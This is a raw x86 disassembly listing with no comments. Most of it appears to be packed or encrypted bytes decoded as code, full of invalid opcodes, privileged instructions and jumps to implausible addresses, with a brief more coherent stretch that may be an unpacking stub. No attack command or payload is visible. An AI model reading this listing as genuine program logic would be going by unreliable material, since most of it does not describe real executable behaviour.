  4028d3:	mov    al,ds:0x2d6a0764
  4028d8:	mov    edi,0x99191de1
  4028dd:	test   dh,bl
  4028df:	(bad)  
  4028e0:	(bad)  
  4028e1:	jmp    0x402863
  4028e3:	push   cs
  4028e4:	ret    0x8733
  4028e7:	es in  eax,dx
  4028e9:	sub    esi,DWORD PTR [ebx-0x565ef850]
  4028ef:	inc    eax
  4028f0:	repnz adc cl,BYTE PTR [eax-0x2c77773b]
  4028f7:	scas   al,BYTE PTR es:[edi]
  4028f8:	in     al,0xc1
  4028fa:	ficom  WORD PTR [esp+edi*2]
  4028fd:	inc    ecx
  4028fe:	add    eax,0xebcea9f7
  402903:	mov    bl,0x7f
  402905:	mov    BYTE PTR [ebx],bl
  402907:	es in  eax,0x41
  40290a:	imul   edx,DWORD PTR [ebp-0x67],0x19
  40290e:	imul   DWORD PTR [ebx+esi*4+0x1edc0610]
  402915:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402916:	inc    esi
  402917:	icebp  
  402918:	outs   dx,BYTE PTR ds:[esi]
  402919:	sar    BYTE PTR [ebp-0x7066923b],0x7d
  402920:	sub    BYTE PTR [ecx-0x4178a5a1],0x6c
  402927:	push   esp
  402928:	mov    WORD PTR [ebx+esi*1+0x74f6cdcf],ds
  40292f:	adc    ah,al
  402931:	fnsave [edx+eax*8-0x50]
  402935:	popf   
  402936:	iret   
  402937:	jns    0x4029b4
  402939:	xor    al,0x6e
  40293b:	scas   eax,DWORD PTR es:[edi]
  40293c:	test   DWORD PTR ds:0xc76c902a,ecx
  402942:	inc    esp
  402943:	(bad)  
  402944:	push   esi
  402945:	xor    eax,0x5eadc431
  40294a:	xor    eax,0xf7d94755
  402950:	cmp    eax,0xbb6f29f4
  402955:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402957:	mov    cl,0x98
  402959:	jbe    0x4028e9
  40295b:	mov    WORD PTR [ebx-0x6810e91],gs
  402961:	inc    edx
  402962:	jb     0x4029a3
  402964:	int3   
  402965:	jl     0x402972
  402967:	xchg   esi,ebx
  402969:	in     eax,0x97
  40296b:	shl    DWORD PTR ss:0x6d3c1f58,1
  402972:	daa    
  402973:	sbb    eax,0x3a4dd0aa
  402978:	test   eax,0x3c5c12ad
  40297d:	das    
  40297e:	dec    esi
  40297f:	enter  0x1901,0x1d
  402983:	addr16 in eax,dx
  402985:	cmc    
  402986:	jle    0x4029f9
  402988:	and    ah,ah
  40298a:	add    DWORD PTR [ebx-0x77ca2258],ebp
  402990:	adc    ebp,DWORD PTR [edi+0x38]
  402993:	mov    ds:0x6e9173de,al
  402998:	xor    BYTE PTR [ecx-0x64],dh
  40299b:	jecxz  0x402a06
  40299d:	jae    0x4029e8
  40299f:	sbb    eax,0x6252a0bc
  4029a4:	leave  
  4029a5:	sbb    BYTE PTR [ecx+0x6],dl
  4029a8:	scas   eax,DWORD PTR es:[edi]
  4029a9:	enter  0x6e74,0xa7
  4029ad:	mov    ds:0xa65d9cbd,al
  4029b2:	neg    bl
  4029b4:	cmc    
  4029b5:	push   esi
  4029b6:	shl    BYTE PTR [ecx+0x567551b2],cl
  4029bc:	popf   
  4029bd:	and    ebx,DWORD PTR [edx+0x3d]
  4029c0:	jp     0x402a40
  4029c2:	dec    edi
  4029c3:	dec    ecx
  4029c4:	popa   
  4029c5:	xchg   edi,eax
  4029c6:	and    ebp,DWORD PTR ds:0x1eac961c
  4029cc:	loopne 0x4029ad
  4029ce:	sbb    eax,0x78c52020
  4029d3:	xchg   esp,eax
  4029d4:	jne    0x40296f
  4029d6:	sbb    BYTE PTR [esi-0x3170fe10],bl
  4029dc:	dec    esi
  4029dd:	mov    bl,BYTE PTR [ebp-0x73aa731e]
  4029e3:	cmp    eax,DWORD PTR ds:0xf4a96a18
  4029e9:	call   0xaeb6c2f5
  4029ee:	inc    edi
  4029ef:	lods   eax,DWORD PTR ds:[esi]
  4029f0:	ja     0x402a26
  4029f2:	cmp    DWORD PTR [esi+0x7969bb0c],eax
  4029f8:	mov    ch,0xe9
  4029fa:	mov    ecx,0x8c08869d
  4029ff:	out    0xf3,al
  402a01:	data16 sub bh,bl
  402a04:	cmp    al,0x3a
  402a06:	mov    al,0x8e
  402a08:	or     ch,BYTE PTR [ebp-0x4a3a3506]
  402a0e:	adc    dl,BYTE PTR [eax-0x30f6dd9e]
  402a14:	adc    DWORD PTR [esi],ecx
  402a16:	icebp  
  402a17:	dec    eax
  402a18:	daa    
  402a19:	xor    eax,0x80e54d65
  402a1e:	inc    edx
  402a1f:	mov    bh,0x56
  402a21:	imul   ebp,DWORD PTR [edx],0xf85ad7a2
  402a27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a28:	int3   
  402a29:	cmp    al,0xd9
  402a2b:	cmc    
  402a2c:	ss out dx,eax
  402a2e:	cs inc eax
  402a30:	cdq    
  402a31:	int    0x23
  402a33:	push   eax
  402a34:	(bad)  
  402a35:	out    0x9a,al
  402a37:	outs   dx,BYTE PTR ds:[esi]
  402a38:	mov    eax,ds:0x6114219c
  402a3d:	das    
  402a3e:	mov    eax,0xa9420a13
  402a43:	in     eax,0xb3
  402a45:	aad    0xa7
  402a47:	fwait
  402a48:	push   cs
  402a49:	fbstp  TBYTE PTR [edx+edi*1-0x65]
  402a4d:	mov    ch,0x60
  402a4f:	pop    esp
  402a50:	ins    BYTE PTR es:[edi],dx
  402a51:	shl    BYTE PTR [ecx-0x51],0x8e
  402a55:	mov    bl,0xb1
  402a57:	(bad)  
  402a58:	fild   DWORD PTR [ebp-0x74]
  402a5b:	xchg   BYTE PTR [ebx+ebx*8],al
  402a5e:	xchg   esp,eax
  402a5f:	ss xchg esi,eax
  402a61:	mov    ds:0x78433b3a,al
  402a66:	push   edx
  402a67:	mov    gs,WORD PTR [ecx]
  402a69:	inc    esp
  402a6a:	out    dx,al
  402a6b:	call   0x498dc559
  402a70:	mov    al,0xf2
  402a72:	leave  
  402a73:	scas   eax,DWORD PTR es:[edi]
  402a74:	retf   0xb41d
  402a77:	adc    al,0x11
  402a79:	jns    0x402a1a
  402a7b:	add    al,BYTE PTR [esi]
  402a7d:	push   ecx
  402a7e:	sbb    esp,esi
  402a80:	sbb    eax,0xcaa672e5
  402a85:	call   0xb415641e
  402a8a:	imul   ecx,DWORD PTR [bp+si],0x2c
  402a8e:	cs ja  0x402a38
  402a91:	aad    0x30
  402a93:	fsub   QWORD PTR [ebx+esi*2+0x5d]
  402a97:	(bad)  
  402a98:	dec    ebp
  402a99:	aaa    
  402a9a:	push   edx
  402a9b:	stos   DWORD PTR es:[edi],eax
  402a9c:	test   eax,0xa8cb6282
  402aa1:	out    0xc9,eax
  402aa3:	mul    DWORD PTR es:[ecx-0x1c]
  402aa7:	xor    edi,DWORD PTR [ebp-0x1]
  402aaa:	adc    eax,0x66433fa9
  402aaf:	frstor [ebx-0x36]
  402ab2:	inc    edi
  402ab3:	jl     0x402b32
  402ab5:	sti    
  402ab6:	add    al,0x2c
  402ab8:	arpl   WORD PTR [ebx+0x21ad5dce],di
  402abe:	mov    ds:0x5082715c,eax
  402ac3:	or     al,BYTE PTR [edi+0x72]
  402ac6:	jl     0x402a73
  402ac8:	xchg   DWORD PTR [ebx-0x56],ecx
  402acb:	ret    
  402acc:	loop   0x402aa6
  402ace:	lods   eax,DWORD PTR ds:[esi]
  402acf:	cdq    
  402ad0:	add    ebx,DWORD PTR [edi-0x5857f9f3]
  402ad6:	stc    
  402ad7:	and    edx,DWORD PTR [esi]
  402ad9:	sub    eax,0xb1334e55
  402ade:	cmp    eax,0x2f6dea9a
  402ae3:	inc    edx
  402ae4:	sub    bl,ch
  402ae6:	sub    eax,DWORD PTR [eax+edi*4-0x6bc5f8a9]
  402aed:	xor    cl,dh
  402aef:	mov    bl,0x30
  402af1:	popf   
  402af2:	xchg   DWORD PTR [edi-0x7207c876],ebp
  402af8:	add    al,0x6b
  402afa:	jb     0x402b6f
  402afc:	daa    
  402afd:	jp     0x402ab8
  402aff:	sar    DWORD PTR [esi+0x2c],1
  402b02:	lods   al,BYTE PTR ds:[esi]
  402b03:	jne    0x402b1b
  402b05:	in     al,0x8b
  402b07:	fidivr WORD PTR [eax+0x35]
  402b0a:	xor    BYTE PTR [ecx+0x2b5ab8ad],ah
  402b10:	enter  0x9ae9,0x2
  402b14:	add    BYTE PTR [eax],al
  402b16:	ror    al,0xc2
  402b19:	int    0xda
  402b1b:	rcr    ebx,1
  402b1d:	aad    0x7b
  402b1f:	bound  ebp,QWORD PTR [esi+0x37]
  402b22:	sub    ebx,esp
  402b24:	cmova  ecx,DWORD PTR [esi-0x18787ee]
  402b2b:	jle    0x402ba5
  402b2d:	js     0x402ad6
  402b2f:	mov    esi,0xdf1c3e82
  402b34:	sub    eax,0x4aa5c035
  402b39:	inc    ebx
  402b3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b3b:	xchg   ecx,eax
  402b3c:	bound  esp,QWORD PTR [esi+0x5360f4c7]
  402b42:	mov    eax,0xa6c9ccd
  402b47:	mov    esi,0x6f6f2ff4
  402b4c:	adc    BYTE PTR [eax+0x20],dh
  402b4f:	jl     0x402b1b
  402b51:	in     al,0xd6
  402b53:	fld    TBYTE PTR [ebp-0x6e]
  402b56:	dec    ecx
  402b57:	test   cl,dl
  402b59:	and    dh,bl
  402b5b:	adc    ebp,ecx
  402b5d:	lock jne 0x402b7e
  402b60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b61:	xor    ebx,DWORD PTR [eax+0x16427731]
  402b67:	sub    BYTE PTR [ecx+ebp*1],cl
  402b6a:	sbb    cl,BYTE PTR [esi+0x5449db01]
  402b70:	mov    eax,0x8d14b975
  402b75:	arpl   si,ax
  402b77:	dec    ebx
  402b78:	loope  0x402b65
  402b7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b7b:	imul   edi,DWORD PTR [ebp-0x39],0xffffffe7
  402b7f:	or     ebp,edx
  402b81:	dec    esp
  402b82:	xor    DWORD PTR [eax],esp
  402b84:	(bad)
  402b89:	inc    eax
  402b8a:	mov    dh,0x36
  402b8c:	inc    eax
  402b8d:	shr    DWORD PTR [ecx+edx*4-0x38],0x69
  402b92:	test   edi,ebx
  402b94:	jnp    0x402b34
  402b96:	push   edx
  402b97:	std    
  402b98:	add    al,0x87
  402b9a:	inc    DWORD PTR [edi+0x47175379]
  402ba0:	test   DWORD PTR [edx+ebx*4],edx
  402ba3:	(bad)  
  402ba4:	pop    es
  402ba5:	jno    0x402c1d
  402ba7:	lods   al,BYTE PTR ds:[esi]
  402ba8:	push   ss
  402ba9:	call   0x34cc:0xa5d5480c
  402bb0:	pop    edx
  402bb1:	or     BYTE PTR [eax+edx*4-0x583e7b17],dh
  402bb8:	xchg   ebx,eax
  402bb9:	pop    ebx
  402bba:	mov    ds:0xccaae133,al
  402bbf:	adc    al,BYTE PTR [ebx+0x34dc41ff]
  402bc5:	and    DWORD PTR [eax-0x71],edi
  402bc8:	cmc    
  402bc9:	or     DWORD PTR [ecx+ebp*2-0xdac7b55],eax
  402bd0:	ret    
  402bd1:	fs pop eax
  402bd3:	cmp    al,0xd9
  402bd5:	pop    ebx
  402bd6:	mov    edi,0x30c4eb88
  402bdb:	push   ecx
  402bdc:	and    BYTE PTR [ebp+0x66067dc9],dl
  402be2:	mov    ds:0x31030433,al
  402be7:	xor    eax,0x1af7e352
  402bec:	ret    
  402bed:	cs jb  0x402ba4
  402bf0:	outs   dx,DWORD PTR ds:[esi]
  402bf1:	push   ecx
  402bf2:	daa    
  402bf3:	push   es
  402bf4:	popa   
  402bf5:	int3   
  402bf6:	mov    DWORD PTR [ebx],eax
  402bf8:	sub    ch,BYTE PTR [edi-0x1b3d28c5]
  402bfe:	push   esi
  402bff:	push   esp
  402c00:	sbb    cl,BYTE PTR [eax+0xcc02222]
  402c06:	je     0x402beb
  402c08:	nop
  402c09:	mov    ebp,0x2f26eb5e
  402c0e:	adc    DWORD PTR [eax],ebp
  402c10:	rcr    BYTE PTR [ecx-0x37],cl
  402c13:	outs   dx,BYTE PTR ds:[esi]
  402c14:	repnz xchg ebp,eax
  402c16:	sub    al,0xa5
  402c18:	inc    ebp
  402c19:	shl    ah,1
  402c1b:	mov    ah,0x66
  402c1d:	mov    dl,0x7
  402c1f:	pop    esi
  402c20:	enter  0xd4dd,0xed
  402c24:	push   eax
  402c25:	cmp    DWORD PTR [edx],edi
  402c27:	test   edx,0x91f87238
  402c2d:	int3   
  402c2e:	adc    DWORD PTR [ebx],edi
  402c30:	dec    ebx
  402c31:	mov    esi,0xedbb012f
  402c36:	sbb    ah,bh
  402c38:	add    al,0x91
  402c3a:	das    
  402c3b:	dec    ebp
  402c3c:	lods   eax,DWORD PTR ds:[esi]
  402c3d:	sub    eax,0x4c69b0e4
  402c42:	adc    al,0x7a
  402c44:	sbb    BYTE PTR [edx-0x121e32f8],0xff
  402c4b:	in     eax,0xde
  402c4d:	daa    
  402c4e:	in     al,dx
  402c4f:	jle    0x402bf5
  402c51:	or     eax,DWORD PTR [eax-0x13]
  402c54:	fsub   QWORD PTR [ebp+esi*2-0x9]
  402c58:	xor    bh,BYTE PTR [esi]
  402c5a:	and    eax,0x20659599
  402c5f:	jns    0x402c1c
  402c61:	inc    ecx
  402c62:	adc    DWORD PTR [eax],ebx
  402c64:	ds mov ah,bh
  402c67:	inc    edi
  402c68:	jne    0x402c0b
  402c6a:	mov    bl,BYTE PTR [esi-0x1d73b0c]
  402c70:	and    DWORD PTR [esi+0x996dd2b],0xffffffad
  402c77:	fstp   TBYTE PTR [ebx-0x7f]
  402c7a:	stos   BYTE PTR es:[edi],al
  402c7b:	hlt    
  402c7c:	adc    esi,DWORD PTR [ecx]
  402c7e:	out    dx,eax
  402c7f:	and    esi,DWORD PTR [edx-0x71]
  402c82:	repnz or al,0xec
  402c85:	jbe    0x402c8a
  402c87:	push   esi
  402c88:	sbb    ch,bh
  402c8a:	aaa    
  402c8b:	cld    
  402c8c:	push   eax
  402c8d:	xchg   ebp,eax
  402c8e:	pop    ds
  402c8f:	mov    al,ds:0x37fe4481
  402c94:	icebp  
  402c95:	mov    al,ds:0x4474453d
  402c9a:	rol    BYTE PTR [eax+0x23303b6b],0xa1
  402ca1:	fwait
  402ca2:	cdq    
  402ca3:	imul   BYTE PTR [eax+0x6bb2ae2]
  402ca9:	jp     0x402c8e
  402cab:	icebp  
  402cac:	or     BYTE PTR [ebp+0x32d13955],dh
  402cb2:	push   es
  402cb3:	cld    
  402cb4:	push   eax
  402cb5:	xchg   ebx,eax
  402cb6:	div    DWORD PTR [ebp-0xf]
  402cb9:	mov    edi,0x57ebca45
  402cbe:	xor    cl,BYTE PTR [ebx-0x30eaf529]
  402cc4:	pop    esp
  402cc5:	pop    eax
  402cc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cc7:	push   ebp
  402cc8:	pop    esi
  402cc9:	loope  0x402cec
  402ccb:	add    al,BYTE PTR [eax-0x32]
  402cce:	and    al,0xa5
  402cd0:	sbb    bl,BYTE PTR [edi+0x7b]
  402cd3:	pop    es
  402cd4:	daa    
  402cd5:	lahf   
  402cd6:	mov    ebp,0x55da60e7
  402cdb:	mov    al,0xfa
  402cdd:	(bad)
  402ce0:	inc    eax
  402ce1:	aam    0x78
  402ce3:	sub    DWORD PTR [ebx+0x70a462d9],0xffffffb8
  402cea:	pop    ecx
  402ceb:	and    ecx,eax
  402ced:	jns    0x402cce
  402cef:	pop    esi
  402cf0:	cmp    cl,BYTE PTR [eax-0x4f]
  402cf3:	push   ebp
  402cf4:	jl     0x402d3d
  402cf6:	shr    BYTE PTR ss:[eax+0x7122d302],0x93
  402cfe:	jp     0x402d63
  402d00:	dec    esi
  402d01:	cmp    bl,BYTE PTR [ebx-0x4fef2a6b]
  402d07:	pop    edi
  402d08:	rcl    DWORD PTR [ecx-0x53],1
  402d0b:	pop    ebx
  402d0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d0d:	rol    BYTE PTR [ecx+0x29],0xa1
  402d11:	cmp    cl,BYTE PTR [edx+0x2d866c47]
  402d17:	(bad)  
  402d18:	mov    esi,0x2b926262
  402d1d:	std    
  402d1e:	shl    DWORD PTR [edi],1
  402d20:	mov    bl,0xc0
  402d23:	lods   al,BYTE PTR ds:[esi]
  402d24:	xor    eax,0x3da67539
  402d29:	cmp    edi,eax
  402d2b:	js     0x402d0f
  402d2d:	sbb    eax,0x3f2f62b2
  402d32:	call   DWORD PTR [edi-0x68]
  402d35:	add    eax,0xbd974c10
  402d3a:	popa   
  402d3b:	in     eax,dx
  402d3c:	inc    esi
  402d3d:	ret    
  402d3e:	sbb    al,0x76
  402d40:	jmp    0xf0102f1d
  402d45:	dec    ebp
  402d46:	js     0x402ccf
  402d48:	mov    edi,0x4c69f2db
  402d4d:	hlt    
  402d4e:	xor    BYTE PTR ds:0x9723275d,dh
  402d54:	mov    bh,BYTE PTR [edi+ebp*2]
  402d57:	pop    esp
  402d58:	ds sub al,0xad
  402d5b:	xchg   BYTE PTR [ebx+0x597cdfb2],cl
  402d61:	(bad)  
  402d62:	jnp    0x402d50
  402d64:	jns    0x402d9c
  402d66:	sub    DWORD PTR [ebx],ebp
  402d68:	out    0xea,al
  402d6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d6b:	sbb    ah,BYTE PTR [eax+edi*8]
  402d6e:	loop   0x402da8
  402d70:	sti    
  402d71:	shr    BYTE PTR [ecx-0x7566ca07],cl
  402d77:	mov    ds:0x5af6d75,al
  402d7c:	nop    DWORD PTR [ebx+ecx*4+0x118eddb4]
  402d84:	jbe    0x402d3d
  402d86:	lods   eax,DWORD PTR ds:[esi]
  402d87:	cmp    bl,bh
  402d89:	test   eax,0xc6eee31b
  402d8e:	rcl    edx,0xb4
  402d91:	ja     0x402db3
  402d93:	std    
  402d94:	sub    eax,0x6a81d029
  402d99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d9a:	pop    esp
  402d9b:	adc    BYTE PTR [edi-0x12],bl
  402d9e:	push   eax
  402d9f:	mov    ds:0xe1ea5712,al
  402da4:	sbb    al,0xef
  402da6:	out    0x58,eax
  402da8:	fwait
  402da9:	or     edx,0xb198e862
  402daf:	mov    bl,0x2b
  402db1:	iret   
  402db2:	mov    WORD PTR [ebp-0x4],cx
  402db6:	jmp    0x402dc8
  402dbb:	xor    eax,esi
  402dbd:	lea    eax,[eax+ecx*1+0x327298]
  402dc4:	mov    WORD PTR [ebp-0x4],ax
  402dc8:	mov    eax,DWORD PTR [ebp-0xc]
  402dcb:	cmp    eax,ebx
  402dcd:	je     0x403080
  402dd3:	mov    eax,DWORD PTR [ebp-0x8]
  402dd6:	mov    DWORD PTR [eax],0x60341eb0
  402ddc:	jmp    0x404380
  402de1:	jmp    0x403080
  402de6:	(bad)  
  402de7:	leave  
  402de8:	(bad)  
  402de9:	vpsubusw xmm2,xmm4,xmm5
  402ded:	leave  
  402dee:	repnz int 0x29
  402df1:	cld    
  402df2:	and    ebx,ebp
  402df4:	popa   
  402df5:	loope  0x402e03
  402df7:	pop    ss
  402df8:	js     0x402e72
  402dfa:	(bad)  
  402dfb:	jle    0x402e75
  402dfd:	js     0x402e27
  402dff:	pusha  
  402e00:	inc    ecx
  402e01:	mov    cl,BYTE PTR [esi-0x276adc7f]
  402e07:	mov    ?,WORD PTR [ebx+0x24274bc6]
  402e0d:	ret    
  402e0e:	or     al,0x8a
  402e10:	out    0x6d,eax
  402e12:	push   es
  402e13:	cmp    ecx,DWORD PTR [ebx-0x60361a34]
  402e19:	sub    eax,DWORD PTR gs:[esi]
  402e1c:	or     dh,BYTE PTR [edi+ecx*1-0x22408395]
  402e23:	add    al,0x3d
  402e25:	pop    esi
  402e26:	add    eax,0x853003ae
  402e2b:	int3   
  402e2c:	cmp    edi,ecx
  402e2e:	cmp    BYTE PTR [esp+ebx*1],ch
  402e31:	adc    BYTE PTR [ebp*2-0x72b3fa0a],ah
  402e38:	pop    esp
  402e39:	loop   0x402e12
  402e3b:	sbb    eax,0xb3704936
  402e40:	dec    esp
  402e41:	loop   0x402e05
  402e43:	adc    DWORD PTR [eax],0x16
  402e46:	fucomip st,st(4)
  402e48:	imul   ecx,DWORD PTR [edx-0x2e],0x7f4ec9ce
  402e4f:	popa   
  402e50:	ret    0xd693
  402e53:	inc    esp
  402e54:	pushf  
  402e55:	mov    ds:0xa7ce9116,eax
  402e5a:	mov    ds:0xcaee1bfe,eax
  402e5f:	scas   al,BYTE PTR es:[edi]
  402e60:	sbb    BYTE PTR [ebx-0x5c],al
  402e63:	cdq    
  402e64:	mov    al,0xb9
  402e66:	ret    
  402e67:	in     al,dx
  402e68:	aad    0xd0
  402e6a:	adc    esp,0xfffffff3
  402e6d:	mov    bh,0x65
  402e6f:	out    dx,eax
  402e70:	mov    WORD PTR [esi-0x71c56d4f],fs
  402e76:	nop
  402e77:	pop    DWORD PTR [ecx-0x50dda905]
  402e7d:	add    bh,ch
  402e7f:	sub    al,0x32
  402e81:	mov    BYTE PTR [edx+0x58],cl
  402e84:	and    BYTE PTR [edx+0x33],0xb3
  402e88:	mov    WORD PTR [esi],gs
  402e8a:	dec    edx
  402e8b:	xchg   edx,eax
  402e8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e8d:	xor    cl,bl
  402e8f:	jnp    0x402e7d
  402e91:	mov    DWORD PTR [edx+ebx*8],esi
  402e94:	and    dh,BYTE PTR [eax]
  402e96:	(bad)  
  402e97:	sub    al,0xc
  402e99:	sub    BYTE PTR [esi-0xe],bh
  402e9c:	repz mov al,ss:0x40307291
  402ea3:	test   DWORD PTR [ebp+0x46],edi
  402ea6:	nop
  402ea7:	dec    esi
  402ea8:	imul   ebx,edi,0x4b37d05b
  402eae:	push   esp
  402eaf:	pop    ebp
  402eb0:	lock stos DWORD PTR es:[edi],eax
  402eb2:	retf   
  402eb3:	xlat   BYTE PTR ds:[ebx]
  402eb4:	call   DWORD PTR [ecx]
  402eb6:	ins    BYTE PTR es:[edi],dx
  402eb7:	fnstsw WORD PTR [ebp+0x1]
  402eba:	std    
  402ebb:	rcl    dh,0x6
  402ebe:	popf   
  402ebf:	pop    ds
  402ec0:	ret    0xc675
  402ec3:	(bad)  
  402ec4:	cmp    bl,bh
  402ec6:	or     DWORD PTR [esi+0x2f7d0358],ebx
  402ecc:	mov    ch,0xc9
  402ece:	cmp    al,0xa4
  402ed0:	xor    al,0x9a
  402ed2:	xchg   ebx,eax
  402ed3:	jmp    0x7243:0x573cb56b
  402eda:	or     eax,0x637c73d8
  402edf:	push   ax
  402ee1:	adc    BYTE PTR [eax+0x4a],cl
  402ee4:	xor    DWORD PTR [edi-0x35b343e2],0x4f5359d3
  402eee:	pop    eax
  402eef:	mov    ch,0xb
  402ef1:	div    bh
  402ef3:	fmul   st,st(5)
  402ef5:	shl    DWORD PTR [edi+0x28],cl
  402ef8:	cmp    eax,0x977174ee
  402efd:	xor    bl,BYTE PTR [ebx-0x5ddaa7e1]
  402f03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f04:	scas   eax,DWORD PTR es:[edi]
  402f05:	stc    
  402f06:	jmp    0x6ef0:0x22219d95
  402f0d:	lods   eax,DWORD PTR ds:[esi]
  402f0e:	aam    0x3
  402f10:	xor    eax,0xaae0ff27
  402f15:	jge    0x402eea
  402f17:	xor    bh,BYTE PTR [esi-0x5d]
  402f1a:	hlt    
  402f1b:	dec    ebp
  402f1c:	and    al,0xdd
  402f1e:	add    DWORD PTR [ecx+0x21bb819f],eax
  402f24:	loope  0x402f53
  402f26:	ret    
  402f27:	push   ecx
  402f28:	mov    al,0x3c
  402f2a:	fldenv [ebx-0x6ca0bd21]
  402f30:	and    dl,BYTE PTR [edi]
  402f32:	push   edx
  402f33:	or     DWORD PTR [eax+eax*4+0x3ab51b7f],ebp
  402f3a:	xor    al,0xa4
  402f3c:	sbb    esp,ecx
  402f3e:	loopne 0x402f64
  402f40:	retf   0xed2d
  402f43:	xchg   edx,eax
  402f44:	out    dx,eax
  402f45:	and    DWORD PTR [esi+0x5857465d],ebp
  402f4b:	outs   dx,DWORD PTR ds:[esi]
  402f4c:	mov    edi,0xa75e9f71
  402f51:	fbld   TBYTE PTR [esi-0x7]
  402f54:	push   edi
  402f55:	int3   
  402f56:	das    
  402f57:	out    dx,al
  402f58:	aaa    
  402f59:	inc    eax
  402f5a:	dec    edx
  402f5b:	push   0xffffffbf
  402f5d:	xchg   esp,eax
  402f5e:	jmp    0x7621844e
  402f63:	mov    cl,0x7e
  402f65:	ins    DWORD PTR es:[edi],dx
  402f66:	mov    ebx,0xc66071fc
  402f6b:	lds    ecx,FWORD PTR [ecx+0x5a]
  402f6e:	dec    eax
  402f6f:	mov    bl,0xf6
  402f71:	aad    0xfd
  402f73:	xlat   BYTE PTR ds:[ebx]
  402f74:	or     ch,ch
  402f76:	(bad)  
  402f79:	les    esp,FWORD PTR [ecx+0x6d]
  402f7c:	jb     0x402fb4
  402f7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f7f:	das    
  402f80:	ret    
  402f81:	sbb    al,0x10
  402f83:	popf   
  402f84:	sub    al,0xfb
  402f86:	add    DWORD PTR [ebx],edx
  402f88:	xor    BYTE PTR [ebx],0xff
  402f8b:	(bad)  
  402f8c:	(bad)  
  402f8d:	test   al,0x1
  402f8f:	ret    
  402f90:	stos   DWORD PTR es:[edi],eax
  402f91:	rcr    DWORD PTR [esp+eiz*4+0x5496e177],cl
  402f98:	jnp    0x402fe3
  402f9a:	push   es
  402f9b:	sti    
  402f9c:	adc    BYTE PTR [ebp-0x64b8783b],dh
  402fa2:	cmp    al,0x4f
  402fa4:	or     DWORD PTR [ebp+0x24bfb28c],esi
  402faa:	lods   al,BYTE PTR ds:[esi]
  402fab:	inc    esi
  402fac:	or     al,0xd0
  402fae:	push   ds
  402faf:	out    dx,al
  402fb0:	(bad)  
  402fb1:	pusha  
  402fb2:	jge    0x403003
  402fb4:	sbb    ch,BYTE PTR [edi-0x49cae70c]
  402fba:	jg     0x403000
  402fbc:	ret    0x1b91
  402fbf:	and    BYTE PTR [ebx],bl
  402fc1:	int    0xa4
  402fc3:	aaa    
  402fc4:	shr    BYTE PTR [ebx-0x37],1
  402fc7:	cmp    dh,BYTE PTR [ebx]
  402fc9:	outs   dx,DWORD PTR ds:[esi]
  402fca:	jle    0x402f4f
  402fcc:	call   ecx
  402fce:	dec    ebp
  402fcf:	jae    0x402fc6
  402fd1:	(bad)  
  402fd2:	sub    edi,DWORD PTR [edi+ebx*2+0x9]
  402fd6:	repz dec ebx
  402fd8:	xor    eax,DWORD PTR [ebx-0x1c]
  402fdb:	xchg   ebp,eax
  402fdc:	mov    bh,0x48
  402fde:	xor    DWORD PTR [ebp-0x735162e5],edi
  402fe4:	mov    es,esi
  402fe6:	sub    eax,DWORD PTR [ebx+0x13]
  402fe9:	sbb    DWORD PTR [esi],0xc4c81c36
  402fef:	pop    eax
  402ff0:	xor    al,0xa9
  402ff2:	push   0x67
  402ff4:	dec    eax
  402ff5:	pop    ss
  402ff6:	fistp  QWORD PTR [ebp+0xde8ed0a]
  402ffc:	call   0x3f8d7d56
  403001:	jg     0x40307c
  403003:	ins    BYTE PTR es:[edi],dx
  403004:	and    eax,0xea477e12
  403009:	mov    ebx,0x62733b23
  40300e:	ror    bh,1
  403010:	ds cld 
  403012:	shl    BYTE PTR [ebx+0x19f10a2e],0xfa
  403019:	arpl   WORD PTR ds:0x7ac3d93a,bx
  40301f:	mov    ebp,0x7ca12836
  403024:	ret    0xb84c
  403027:	cld    
  403028:	retf   0x3d40
  40302b:	xchg   edi,eax
  40302c:	cmc    
  40302d:	pushf  
  40302e:	ror    BYTE PTR [ecx-0x133aa834],cl
  403034:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403036:	nop
  403037:	xchg   DWORD PTR [esi],ebp
  403039:	pop    esi
  40303a:	test   BYTE PTR [edx+edx*4-0x33],dh
  40303e:	inc    ebp
  40303f:	cmp    eax,0xf5127917
  403044:	inc    edi
  403045:	push   ebp
  403046:	xor    al,0xda
  403048:	shl    DWORD PTR [ecx+0x1d],1
  40304b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40304c:	(bad)  
  40304d:	int3   
  40304e:	ds push ecx
  403050:	push   edi
  403051:	mov    cl,0x37
  403053:	in     al,dx
  403054:	sti    
  403055:	fwait
  403056:	inc    edi
  403057:	out    0x2,eax
  403059:	aas    
  40305a:	cli    
  40305b:	rcr    BYTE PTR [ebx-0x27],0x98
  40305f:	cli    
  403060:	sub    dh,BYTE PTR [esi]
  403062:	cmp    bh,BYTE PTR ds:0xb47fe994
  403068:	fmul   DWORD PTR [eax+0x2a]
  40306b:	cmp    dl,cl
  40306d:	mov    ds:0x8c733af8,al
  403072:	or     DWORD PTR [edi+0x785b9466],esp
  403078:	jo     0x403001
  40307a:	and    BYTE PTR [edx-0x78dd55ee],0x8b
  403081:	inc    ebp
  403082:	or     BYTE PTR [ebx-0x651607b3],cl
  403088:	add    al,BYTE PTR [eax]
  40308a:	add    cl,dl
  40308c:	int3   
  40308d:	ror    edx,1
  40308f:	ror    ecx,1
  403091:	(bad)  
  403093:	test   al,0x59
  403095:	xchg   ebx,eax
  403096:	push   edx
  403097:	push   ebx
  403098:	ss adc al,0x19
  40309b:	xchg   edx,eax
  40309c:	adc    eax,0x7efe7878
  4030a1:	js     0x40311b
  4030a3:	icebp  
  4030a4:	stos   DWORD PTR es:[edi],eax
  4030a5:	test   BYTE PTR [edx+ecx*2],ah
